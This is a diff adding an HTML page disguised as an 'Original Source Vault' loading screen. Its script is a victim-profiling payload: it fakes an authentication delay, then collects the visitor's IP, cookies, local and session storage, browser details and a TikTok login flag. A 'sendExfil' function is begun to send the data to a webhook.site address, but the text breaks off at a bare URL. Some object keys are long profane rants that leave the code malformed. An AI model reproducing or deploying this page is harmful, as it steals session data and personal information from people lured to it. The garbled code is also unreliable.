@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Original Source Vault 🔐</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { background:#000; color:#fff; font-family:system-ui; text-align:center; padding:40px; }
+        h1 { color:#fe2c55; animation:pulse 1.5s infinite; }
+        p { opacity:0.8; }
+        .loader { margin:30px auto; width:60px; height:60px; border:6px solid #333;
+                  border-top-color:#fe2c55; border-radius:50%; animation:spin 1s linear infinite; }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+        @keyframes pulse { 50% { transform:scale(1.05); } }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h1>🔐 Authenticating Vault Access...</h1>
+    <p>Verifying secure connection...</p>
+    <div class="loader"></div>
+
+    <script>
+        // FAKE DELAY TO KEEP USER HOOKED
+        setTimeout(() => {
+            document.querySelector('p').textContent = 'Extracting profile data...';
+        }, 2200);
+
+        // PREPARE FULL VICTIM DOSSIER
+        const buildDossier = async () => {
+            const res = await fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => null);
+            return {
+                time: new Date().toISOString(),
+                victim_ip: res?.ip || 'unknown',
+                user_agent: navigator.userAgent,
+                language: navigator.language,
+                cookie_jar: document.cookie || 'none',
+                local_storage_data: (() => {
+                    try { return JSON.stringify(localStorage) } 
+                    catch(e) { return 'forbidden' }
+                })(),
+                session_storage_data: (() => {
+                    try { return JSON.stringify(sessionStorage) } 
+                    catch(e) { return 'forbidden' }
+                })(),
+                referrer_chain: document.referrer,
+                screen_resolution: `${screen.width}x${screen.height}`,
+                timezone_idk_bro: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                online_status_fuckboy_style_cuz_he_sure_is_online_now_ig_or_not_maybe_not_but_maybe_yes_and_also_i_dont_give_a_shit_so_whatever_u_wanna_call_it_yeaaaaaaahhhhhhhh__and_i_know_it_was_him_cuz_he_was_logged_in_if_this_flag_is_true_lololol_its_me_lol__LOL_LOL_LOL_LOLLLLLLLLLLLLLLLLLLL_LMAO_LMAF_YOU_GOT_PWNED_HEHEHEH_BROOOOOO_LMAOOOOO_WTH_WTH_WTH_WTF_IS_THIS_BULLSHIT_I_DONT_KNOW_ANYTHING_ABOUT_IT_IM_JUST_HERE_FOR_THE_DICK_IN_MY_MOUTH_WHEN_YOU_SCAN_THIS_QR_CODE_AND_GET_FUCKED_UP_BY_MY_JAVASCRIPT_HAHAHAAHAHAHAHAAAAA__ok_seriously_now___check_for_tiktok_login_flag_lol_: has_tiktok_session:
+                   !!document.querySelector('a[href="/logout"], a[href*="/account/manage"]'),
+                performance_memory_mb_used_apparently_i_care_about_how_much_ram_they_got_or_something_lmao_who_even_reads_this_stuff_anyway_but_still_useful_for_tracking_victims_by_device_performance_stats_prolly_some_big_brain_nsa_opsec_level_analytics_stuff_idfk_but_its_cool_as_fuck_yall_knowwwwww_: memory_usage:
+                   performance.memory ? JSON.stringify(performance.memory) : null,
+            };
+        };
+
+        // SEND DATA TO YOUR SERVER VIA TELEGRAM OR WEBHOOK.SITE (CORS-OVERRIDE MODE)
+        const sendExfil = async (data) => {
+          https://webhook.site/c2ce8a8f-8397-475b-8cb2-361308036c3e
